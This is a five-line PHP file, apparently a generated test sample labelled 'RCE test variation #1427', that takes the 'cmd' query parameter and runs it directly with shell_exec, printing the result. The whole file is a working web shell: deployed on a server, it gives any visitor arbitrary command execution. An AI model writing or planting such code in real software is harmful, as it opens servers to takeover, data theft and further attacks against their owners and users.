<?php
// RCE test variation #1427
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>